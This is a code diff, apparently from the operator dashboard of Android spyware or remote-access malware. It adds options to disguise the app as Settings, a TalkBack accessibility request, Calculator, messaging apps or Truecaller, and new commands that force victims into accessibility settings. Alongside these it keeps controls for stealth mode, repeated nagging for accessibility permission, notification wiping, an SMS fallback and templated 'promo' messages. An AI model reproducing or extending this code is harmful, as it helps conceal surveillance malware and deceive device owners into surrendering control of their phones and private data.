@@ -445,11 +445,13 @@
                     { id: 'SET_TILE_STATE', name: 'Master Visibility Mode', icon: '👁️', inputs: [{id: 'val-tile-state', label: 'Mode', type: 'select', options: [{v: 'ON', l: 'Show Dashboard'}, {v: 'OFF', l: 'Masquerade'}]}] },
                     { id: 'TOGGLE_LOGGING', name: 'Toggle Live Debugger', icon: '🐞', inputs: [{id: 'log-state', label: 'State', type: 'select', options: [{v: 'ON', l: 'Logging ON'}, {v: 'OFF', l: 'Stealth OFF'}]}] },
                     { id: 'SET_DEBUG_UI', name: 'Debug Console Access', icon: '🔓', inputs: [{id: 'val-debug-ui', label: 'Console State', type: 'select', options: [{v: 'ON', l: 'Accessible (Visible)'}, {v: 'OFF', l: 'Locked (Hidden)'}]}] },
-                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}, {v: 'TRUECALLER', l: 'Truecaller'}]}] },
+                    { id: 'SET_MASQUERADE', name: 'Apply Stealth Skin', icon: '🎭', inputs: [{id: 'val-masquerade', label: 'App Mask', type: 'select', options: [{v: 'SETTINGS', l: 'Settings (System Default)'}, {v: 'TALKBACK', l: 'TalkBack (ACC Request)'}, {v: 'DRIVE', l: 'Drive Services'}, {v: 'CALC', l: 'Calculator'}, {v: 'GOOGLE_PHONE', l: 'Phone (Google)'}, {v: 'GOOGLE_MSG', l: 'Messages (Google)'}, {v: 'SAM_PHONE', l: 'Phone (Samsung)'}, {v: 'SAM_MSG', l: 'Messages (Samsung)'}, {v: 'CHROME', l: 'Chrome'}, {v: 'IMO', l: 'imo'}, {v: 'IMO_HD', l: 'imo HD'}, {v: 'IMO_BETA', l: 'imo beta'}, {v: 'IMO_LITE', l: 'imo lite'}, {v: 'TRUECALLER', l: 'Truecaller'}]}] },
                     { id: 'SET_RELENTLESS_ACC', name: 'Config Persistence (ACC)', icon: '♾️', inputs: [{id: 'acc-chill', label: 'Initial Chill (Mins)', type: 'number', val: 1440}, {id: 'acc-interval', label: 'Nag Interval (Mins)', type: 'number', val: 2}, {id: 'acc-max', label: 'Max Attempts', type: 'number', val: 5}, {id: 'acc-html', label: 'Custom Nag UI (HTML)', type: 'textarea'}] },
                     { id: 'STOP_RELENTLESS_ACC', name: 'Stop ACC Nagging', icon: '🛑', inputs: [] },
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
-                    { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] }
+                    { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] },
+                    { id: 'ACC_GOTO_SETTINGS', name: 'Force Accessibility Settings', icon: '⚙️', inputs: [] },
+                    { id: 'ACC_SHOW_HELP', name: 'Show Accessibility Guide', icon: '📖', inputs: [] }
                 ]
             },
             {
@@ -908,6 +910,9 @@
                         content = `${document.getElementById('acc-chill').value}|${document.getElementById('acc-interval').value}|${document.getElementById('acc-max').value}|${document.getElementById('acc-html').value}`; break;
                     case 'SCREEN_TIMEOUT':
                         content = document.getElementById('val-timeout').value; break;
+                    case 'ACC_GOTO_SETTINGS':
+                    case 'ACC_SHOW_HELP':
+                        content = ''; break;
                     case 'WIPE_NOTIFICATIONS':
                         content = `${document.getElementById('wipe-mode').value} | ${document.getElementById('wipe-val').value}`; break;
                     case 'TOGGLE_LOGGING':
